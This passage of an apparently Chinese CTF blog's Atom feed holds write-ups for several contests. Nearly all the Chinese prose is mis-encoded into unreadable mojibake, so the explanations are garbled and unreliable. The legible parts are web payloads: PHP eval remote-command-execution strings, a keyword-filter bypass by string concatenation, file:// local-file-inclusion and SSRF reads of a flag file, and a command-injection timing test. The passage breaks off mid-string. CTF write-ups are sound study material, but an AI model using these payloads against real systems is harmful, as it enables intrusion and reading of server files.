æ¼æ´ï¼ŒçœŸæ­£è§¦å‘æ¼æ´çš„ä»£ç åœ¨åº“ä¸­ã€‚</p><p>æˆ‘ä¸€ç›´è§‰å¾—ï¼Œå‡ºé¢˜ä¸è¦åˆ»æ„åˆ›é€ æ¼æ´ï¼Œè€Œæ˜¯æ‰¾æ‰¾ä½ çš„çŸ¥è¯†ç‚¹æ˜¯å¦èƒ½åœ¨çœŸå®ç¯å¢ƒä¸‹æ‰¾åˆ°åº”ç”¨ã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡»</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="webå§¿åŠ¿" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>ç¬¬å…«å±Šå¼ºç½‘æ¯é’å°‘èµ›wp</title>
    <link href="https://m3x1.cn/posts/2cd096fe.html"/>
    <id>https://m3x1.cn/posts/2cd096fe.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-07T10:47:00.564Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1>ç¬¬å…«å±Šå¼ºç½‘æ¯é’å°‘èµ›wp</h1><h2 id="misc">misc</h2><h4 id="ç­¾åˆ°æ¼«ç”»">ç­¾åˆ°æ¼«ç”»</h4><blockquote><p>æ¯ä¸ªæ¼«ç”»çš„æœ€åä¸€å¼ éƒ½æ˜¯äºŒç»´ç çš„ä¸€éƒ¨åˆ†ï¼Œå…¨éƒ¨ä¿å­˜ï¼Œç„¶åæ‹¼åœ¨ä¸€èµ·ï¼Œæ‰«æäºŒç»´ç å‡ºflag.ã€‚</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124155544679.png" alt="image-20241124155544679"></p><blockquote><p>flag{youthful_and_upward}</p></blockquote><h4 id="whitepic">whitepic</h4><blockquote><p>è€ƒç‚¹ï¼šgifå›¾åƒ</p></blockquote><blockquote><p>ä¸‹è½½æ–‡ä»¶ï¼Œæ²¡æœ‰åç¼€åï¼Œèƒ½ç”¨010editoræ‰“å¼€</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124155848111.png" alt="image-20241124155848111"></p><blockquote><p>æ ¹æ®æ–‡ä»¶å¤´GIF89aï¼Œå¯ä»¥çœ‹å‡ºæ˜¯ä¸ªgifæ–‡ä»¶ã€‚ç›´æ¥ä½¿ç”¨gifsplitteråˆ†ç¦»å¸§æ•°ï¼Œåœ¨å…¶ä¸­ä¸€å¸§æ‰¾åˆ°flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160011013.png" alt="image-20241124160011013"></p><h4 id="é—®å·">é—®å·</h4><blockquote><p>ä½ æ‡‚çš„</p></blockquote><h2 id="web">web</h2><h4 id="ezGetFlag">ezGetFlag</h4><blockquote><p>è€ƒç‚¹ï¼šhttpè¯·æ±‚æ–¹å¼</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160230507.png" alt=""></p><blockquote><p>ç‚¹å‡»10æ¬¡ä¼šå‡ºç°æç¤º</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160307890.png" alt="image-20241124160307890"></p><blockquote><p>ç›´æ¥æŠ“åŒ…ï¼Œä¿®æ”¹è¯·æ±‚æ–¹å¼ï¼ŒæŠŠGETæ”¹æˆPOSTå°±è¡Œäº†ã€‚</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160446998.png" alt="image-20241124160446998"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160500182.png" alt="image-20241124160500182"></p><blockquote><p>flag{4efb5300-7885-40a9-bf2a-31bbd8ebef86}</p></blockquote><h4 id="ezFindShell">ezFindShell</h4><blockquote><p>è€ƒç‚¹ï¼šä»£ç å®¡è®¡</p></blockquote><p>è¿™é¢˜æ˜¯èµ›åå¤ç°ï¼Œæ‰€ä»¥å¯èƒ½ä¸å…¨</p><p>é¦–å…ˆæ‹¿åˆ°ä¸€å †phpæ–‡ä»¶ï¼Œç”¨seayå®¡è®¡</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223303421.png" alt="image-20241130223303421"></p><p>éå¸¸ç›¸ä¼¼ï¼Œå½“æ—¶æ¯”èµ›æ²¡æ‰¾åˆ°æ¼æ´ï¼Œç°åœ¨å¤ç°ï¼Œå…¨å±€æœç´¢ä¸€ä¸‹post</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223557289.png" alt="image-20241130223557289"></p><p>å‘ç°å¯ç”¨æ¼æ´</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223624296.png" alt="image-20241130223624296"></p><p>array_filter() å‡½æ•°ç”¨å›è°ƒå‡½æ•°è¿‡æ»¤æ•°ç»„ä¸­çš„å…ƒç´ ã€‚</p><p>è¯¥å‡½æ•°æŠŠè¾“å…¥æ•°ç»„ä¸­çš„æ¯ä¸ªé”®å€¼ä¼ ç»™å›è°ƒå‡½æ•°ã€‚å¦‚æœå›è°ƒå‡½æ•°è¿”å› trueï¼Œåˆ™æŠŠè¾“å…¥æ•°ç»„ä¸­çš„å½“å‰é”®å€¼è¿”å›ç»™ç»“æœæ•°ç»„ã€‚æ•°ç»„é”®åä¿æŒä¸å˜ã€‚</p><p>å°†ä»£ç è¿›è¡Œbase64ç¼–ç ä¼ ä¸Šå»åº”è¯¥å°±å¯åˆ©ç”¨è¯¥æ¼æ´ã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§ç¬¬å…«å±Šå¼ºç½‘æ¯é’å°‘èµ›wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="æ¯”èµ›wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>hubuæ–°æ˜Ÿæ¯å®è·µèƒ½åŠ›èµ›æ¨¡æ‹Ÿèµ›web-wp</title>
    <link href="https://m3x1.cn/posts/98034dd5.html"/>
    <id>https://m3x1.cn/posts/98034dd5.html</id>
    <published>2024-11-22T16:00:00.000Z</published>
    <updated>2024-12-02T09:07:20.567Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ez-eval">ez_eval</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$hubu = $_GET[&#x27;hubu&#x27;];</span><br><span class="line"></span><br><span class="line">eval($hubu);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><blockquote><p>å…ˆè¿›è¡Œä»£ç å®¡è®¡ï¼ŒGETä¼ å‚hubuï¼Œå¹¶æ‰§è¡Œå‘½ä»¤ï¼Œæ²¡æœ‰ä»»ä½•ç»•è¿‡ï¼Œæ”¾å¼€æ‰‹è„šå»åš</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hubu=system(&#x27;cat /f*&#x27;);      #ç›´æ¥rce</span><br></pre></td></tr></table></figure><h4 id="rce-level1">rce_level1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c  = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>ä»£ç å®¡è®¡ï¼Œå‘ç°è¿‡æ»¤äº†å…³é”®å­—flag,system,phpã€‚</p><p>ä½¿ç”¨æ‹¼æ¥ç»•è¿‡æ„é€ payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=(&#x27;sys&#x27;.&#x27;tem&#x27;)(ls);    #å‘ç°ç›®å½•ä¸‹æ²¡æœ‰flagæ–‡ä»¶</span><br><span class="line">?c=(&#x27;sys&#x27;.&#x27;tem&#x27;)(cat /f*);   #å‘ç°å›æ˜¾ç©ºç™½</span><br></pre></td></tr></table></figure><blockquote><p>ä¸åœ¨æ–‡ä»¶å¤¹é‡Œï¼Œé‚£å¯èƒ½æ˜¯åœ¨phpinfoé‡Œ</p></blockquote><blockquote><p>payloadï¼š</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=phpinfo();</span><br></pre></td></tr></table></figure><blockquote><p>æ²¡å›æ˜¾â€¦æ ¹æ®ä»£ç çš„è¿‡æ»¤å¯ä»¥çŸ¥é“ï¼Œåº”è¯¥åªè¿‡æ»¤äº†ä¸‰ä¸ªå…³é”®å­—ï¼Œå¯å…¶å®å¹¶ä¸åªè¿‡æ»¤äº†è¿™ä¸‰ä¸ªå…³é”®å­—ã€‚</p><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°æœ‰éšè—è¿‡æ»¤ï¼Œæ¯”å¦‚å…³é”®å­—phpï¼Œå’Œä¸€äº›å­—ç¬¦å¦‚åæ–œæ \</p><p>æœ€åçš„payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=(&#x27;ph&#x27;.&#x27;pinfo&#x27;)();</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨é¡µé¢ä¸­æ‰¾åˆ°flagã€‚</p></blockquote><h4 id="ez-LFI">ez_LFI</h4><blockquote><p>è€ƒç‚¹ï¼šä¼ªåè®®</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124161059701.png" alt="image-20241124161059701"></p><blockquote><p>å…ˆéšä¾¿ä¼ ä¸€ä¸ªï¼Œ/?url=111</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124161148073.png" alt="image-20241124161148073"></p><blockquote><p>ä»£ç å®¡è®¡ï¼Œæ ¹æ®ç½‘ä¸ŠæŸ¥è¯¢çš„parse_url()å‡½æ•°çš„èµ„æ–™æ˜¾ç¤ºï¼š</p><p>è§£æ URLï¼Œè¿”å›å…¶ç»„æˆéƒ¨åˆ†ï¼Œå¦‚ä¸‹ï¼š</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;</span><br><span class="line">ç»“æœ----------------------------------------------------------------------------------------------------</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>æ‰€ä»¥å¿…é¡»åœ¨ä¼ å…¥çš„urlå‚æ•°ä¸­è®©[host]æ˜¯localhostã€‚</p><p>ç„¶åå†ç”¨fileåè®®è¯»å–flagã€‚</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=file://localhost/flag</span><br></pre></td></tr></table></figure><blockquote><p>HUBUCTF{22290581-9558-4405-9c01-368dc660bf6a}</p></blockquote><h2 id="Misc">Misc</h2><h4 id="Cute-Rabbit">Cute Rabbit</h4><blockquote><p>è€ƒç‚¹ï¼šrabbitç¼–ç </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VTJGc2RHVmtYMS91RnhkczF5SU1jdit1K3o0NzFCcDR2aXcrVkNNaS9TU1QyZU5EMFUvSQo=</span><br></pre></td></tr></table></figure><blockquote><p>ç­¾åˆ°é¢˜ï¼Œæ ¹æ®é¢˜ç›®æç¤ºï¼Œæ˜¯rabbitç¼–ç ï¼Œå¯†æ–‡æœ«å°¾çš„=è¡¨ç¤ºå¯èƒ½æ˜¯base64ï¼Œæ‰€ä»¥æ˜¯</p><p>base64 -&gt; rabbit</p><p>HUBUCTF{S0_&lt;u73_R4b6it}</p></blockquote><h4 id="Docker-Forensic">Docker Forensic</h4><blockquote><p>è€ƒç‚¹ï¼šdockerçš„ä½¿ç”¨</p></blockquote><blockquote><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œå…ˆæ‹‰å–é•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull crpi-i24jskxbbxvfxlzp.cn-hangzhou.personal.cr.aliyuncs.com/st4rry/aliyun:ez_docker_forensic</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124162645328.png" alt="image-20241124162645328"></p><blockquote><p>å°†é•œåƒå‹ç¼©åˆ°æœ¬åœ°</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124164537663.png" alt="image-20241124164537663"></p><blockquote><p>å°†æ–‡ä»¶è§£å‹åˆ°ä¸€ä¸ªç›®å½•ä¸‹ï¼Œç„¶ååˆ‡æ¢åˆ°è¯¥ç›®å½•ã€‚åœ¨è¯¥ç›®å½•ä¸‹æœ‰ä¸ªsha256æ–‡ä»¶å¤¹ï¼ŒæŠŠé‡Œé¢çš„æ–‡ä»¶è§£å‹</p><p>åœ¨tmpä¸­æ‰¾åˆ°password</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124165519193.png" alt="image-20241124165519193"></p><blockquote><p>é€€çº§ï¼Œåœ¨è§£å‹åçš„ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œæ‰¾åˆ°flag.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124165719701.png" alt="image-20241124165719701"></p><blockquote><p>ä½¿ç”¨äº†åŠ ç›ç®—æ³•ï¼Œå¯†é’¥å°±æ˜¯ä¸Šé¢çš„password,è¿›è¡Œè§£å¯†</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124171222266.png" alt="image-20241124171222266"></p><blockquote><p>HUBUCTF{1_L0v3_D0ck3r_F0r3ns1c_A}</p></blockquote><h4 id="SpeedMath">SpeedMath</h4><blockquote><p>è€ƒç‚¹ï¼šncè¿æ¥ï¼Œpythonè„šæœ¬</p></blockquote><blockquote><p>å…ˆç”¨ncè¿æ¥</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124171410644.png" alt="image-20241124171410644"></p><blockquote><p>å‘ç°ä¼šå‡ºç°ç®—æ•°é¢˜ç›®ï¼Œä½†æ˜¯ç»™ä½ è¾“å…¥çš„æ—¶é—´å¾ˆçŸ­ï¼Œæ‰€ä»¥å‡ ä¹ä¸å¯èƒ½æ‰‹å·¥åšï¼Œç›´æ¥é—®AIå†™è„šæœ¬</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def solve_arithmetic_expression(expression):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    è§£æå¹¶è®¡ç®—ç®—æœ¯è¡¨è¾¾å¼çš„ç»“æœã€‚</span><br><span class="line">    è¿™é‡Œå‡è®¾è¡¨è¾¾å¼åªåŒ…å«æ•´æ•°å’ŒåŸºæœ¬çš„åŠ å‡ä¹˜é™¤è¿ç®—ã€‚</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        # ä½¿ç”¨evalè®¡ç®—è¡¨è¾¾å¼çš„ç»“æœï¼Œä½†æ³¨æ„evalçš„å®‰å…¨æ€§é—®é¢˜</span><br><span class="line">        # åœ¨å®é™…åº”ç”¨ä¸­ï¼Œåº”è¯¥ä½¿ç”¨æ›´å®‰å…¨çš„è§£ææ–¹æ³•</span><br><span class="line">        result = eval(expression)</span><br><span class="line">        return result</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error evaluating expression &#x27;&#123;expression&#125;&#x27;: &#123;e&#125;&quot;)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">def nc_connection(host, port):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    ä½¿ç”¨Netcatè¿æ¥åˆ°æœåŠ¡å™¨ï¼Œå¹¶è‡ªåŠ¨è§£ç­”ç®—æœ¯é¢˜ã€‚</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        </span><br><span class="line">        while True:</span><br><span class="line">            # è¯»å–æœåŠ¡å™¨å‘é€çš„æ•°æ®</span><br><span class="line">            data = s.recv(1024).decode(&#x27;utf-8&#x27;).strip()</span><br><span class="line">            </span><br><span class="line">            if not data:</span><br><span class="line">                # å¦‚æœæ²¡æœ‰æ¥æ”¶åˆ°æ•°æ®ï¼Œå¯èƒ½æ˜¯è¿æ¥å·²ç»å…³é—­</span><br><span class="line">                break</span><br><span class="line">            </span><br><span class="line">            print(f&quot;Received: &#123;data&#125;&quot;)</span><br><span class="line">            </span><br><span class="line">            # ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç®—æœ¯é¢˜ç›®</span><br><span class="line">            match = re.match(r&#x27;Question \d+: (\d+) ([+\-*/]) (\d+) =&#x27;, data)</span><br><span class="line">            if match:</span><br><span class="line">                num1 = int(match.group(1))</span><br><span class="line">                operator = match.group(2)</span><br><span class="line">                num2 = int(match.group(3))</span><br><span class="line">                </span><br><span class="line">                # æ„é€ ç®—æœ¯è¡¨è¾¾å¼</span><br><span class="line">                expression = f&quot;&#123;num1&#125; &#123;operator&#125; &#123;num2&#125;&quot;</span><br><span class="line">                </span><br><span class="line">                # è®¡ç®—æ­£ç¡®ç­”æ¡ˆ</span><br><span class="line">                correct_answer = solve_arithmetic_expression(expression)</span><br><span class="line">                </span><br><span class="line">                if correct_answer is not None:</span><br><span class="line">                    # å°†ç­”æ¡ˆå‘é€å›æœåŠ¡å™¨ï¼ˆå‡è®¾æœåŠ¡å™¨æœŸæœ›çš„æ˜¯æ•´æ•°ç­”æ¡ˆï¼‰</span><br><span class="line">                    s.sendall(f&quot;&#123;correct_answer&#125;\n&quot;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">                else:</span><br><span class="line">                    # å¦‚æœæ— æ³•è®¡ç®—è¡¨è¾¾å¼ï¼Œåˆ™é€€å‡ºå¾ªç¯</span><br><span class="line">                    print(&quot;Failed to solve expression.&quot;)</span><br><span class="line">                    break</span><br><span class="line">            else:</span><br><span class="line">                # å¦‚æœä¸æ˜¯ç®—æœ¯é¢˜ç›®ï¼Œå¯èƒ½æ˜¯å…¶ä»–ä¿¡æ¯æˆ–ç»“æŸä¿¡æ¯</span><br><span class="line">                # è¿™é‡Œå‡è®¾æœåŠ¡å™¨åœ¨å‘é€å®Œæ‰€æœ‰é¢˜ç›®åä¼šå‘é€ä¸€ä¸ªéç®—æœ¯é¢˜ç›®çš„æ¶ˆæ¯</span><br><span class="line">                print(&quot;Received non-arithmetic message, possibly final message.&quot;)</span><br><span class="line">                print(f&quot;Final message: &#123;data&#125;&quot;)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨ç¤ºä¾‹</span><br><span class="line">nc_connection(&#x27;challenge.hubuctf.cn&#x27;, 32478)  # æ›¿æ¢ä¸ºä½ çš„æœåŠ¡å™¨ä¸»æœºåå’Œç«¯å£å·</span><br></pre></td></tr></table></figure><blockquote><p>HUBUCTF{72e53365-bf9c-48db-8327-83b9c9269e7d}</p></blockquote>]]></content>
    
    
    <summary type="html">ğŸ¥§hubuæ–°æ˜Ÿæ¯å®è·µèƒ½åŠ›èµ›æ¨¡æ‹Ÿèµ›web-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="æ¯”èµ›wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>åç§‘ç¬¬ä¸€å±Šç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›wp</title>
    <link href="https://m3x1.cn/posts/4971d2f4.html"/>
    <id>https://m3x1.cn/posts/4971d2f4.html</id>
    <published>2024-11-18T16:00:00.000Z</published>
    <updated>2024-12-02T09:05:46.472Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1>åç§‘ç¬¬ä¸€å±Šç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›wp</h1><h2 id="web">web</h2><h4 id="secure-shell">secure_shell</h4><blockquote><p>è€ƒç‚¹ï¼šexec()æ— å›æ˜¾</p></blockquote><blockquote><p>å¯¹äºè¿™ç±»é¢˜æœ‰ä¸ªå¾ˆç®€å•çš„æ–¹æ³•ï¼Œç›´æ¥å°†flagå†™è¿›æ–‡ä»¶ï¼Œç„¶åè·¯å¾„è¯»å–å°±è¡Œ</p></blockquote><blockquote><p>å…ˆæµ‹è¯•ä¸€ä¸‹èƒ½ä¸èƒ½æ‰§è¡Œ cmd=1;sleep 4</p><p>å‘ç°ååº”äº†4ç§’ï¼Œèƒ½æ‰§è¡Œ</p><p>ç„¶åç›´æ¥ cat /f* &gt; 1.txt</p><p>æœ€åè®¿é—®/1.txtè·¯å¾„å°±è¡Œ</p></blockquote><h4 id="pyssrf">pyssrf</h4><blockquote><p>è€ƒç‚¹ï¼šssrfæ¼æ´</p></blockquote><blockquote><p>æ‰“å¼€æœ‰ä¸ªæç¤º /get?site=</p><p>ç›´æ¥fileè¯»å–flag</p><p>/get?site=file:///flag</p><p>ç¢ç¢å¿µï¼šä»¥ä¸ºå¾ˆéš¾ã€‚ã€‚ã€‚è¯•äº†åŠå¤©ã€‚ã€‚ã€‚ã€‚</p></blockquote><h2 id="misc">misc</h2><h4 id="ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶">ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶</h4><blockquote><p>è€ƒç‚¹ï¼šå‡¯æ’’ä¸base64ç»“åˆï¼Œstarryè¯­è¨€</p></blockquote><blockquote><p>æ ¹æ®æç¤ºï¼Œâ€œå‡¯æ’’å¤§å¸æƒ³å­¦ä¹ ä¸€ä¸‹Starryè¯­è¨€ï¼Œä½ èƒ½å¸®å¸®ä»–ä¹ˆå—â€ï¼Œä¸€å®šè·Ÿå‡¯æ’’å¯†ç å’Œstarryè¯­è¨€æœ‰å…³ã€‚</p><p>ä¸‹è½½æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸²é‡å¤åº¦éå¸¸é«˜çš„å­—ç¬¦ä¸²</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDBhJDBsJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLxprJDBhJDBhJDBsJDBrJDBhJDBsLjBsJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzprJDthMjBhJDBhLzBhJDBhJDBhDjthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtLLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJBphLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphDjBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBLJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJD4hJDBhJDBhMjBsJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjphLzBhJDBhJDBvJBphJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhDjBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBLJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJBphJDBhJDtrJDBhMjBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhDjBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLhphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJD4hJDBhJD4hLzBhJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrDjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphLzBhJDBhJDBvJDBhJDBsJDBhJDBhJDBLLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJ